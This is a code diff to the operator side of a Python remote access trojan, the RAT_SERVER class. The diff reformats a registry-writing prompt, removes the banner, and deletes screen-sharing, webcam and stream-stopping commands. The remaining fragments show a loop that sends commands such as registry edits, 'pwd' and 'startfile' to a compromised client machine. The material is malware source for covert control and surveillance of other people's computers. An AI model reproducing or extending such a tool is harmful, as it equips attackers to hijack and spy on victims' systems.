@@ -26,7 +26,6 @@ class RAT_SERVER:
         print(result_output)
 
     def execute(self):
-        self.banner()
         while True:
             global command
             command = input('Command >>  ')
@@ -49,7 +48,8 @@ class RAT_SERVER:
             elif command == 'setvalue':
                 client.send(command.encode())
                 const = str(input(
-                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, "
+                    "HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                 key = str(input('Enter the key name: '))
                 value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
@@ -282,16 +282,7 @@ class RAT_SERVER:
             elif command == 'pwd':
                 self.result()
 
-            elif command == 'screenshare':
-                client.send(command.encode("utf-8"))
-                self.server()
 
-            elif command == 'webcam':
-                client.send(command.encode("utf-8"))
-                self.server()
-
-            elif command == 'breakstream':
-                self.stop_server()
 
             elif command[:9] == 'startfile':
                 if not command[10:]:
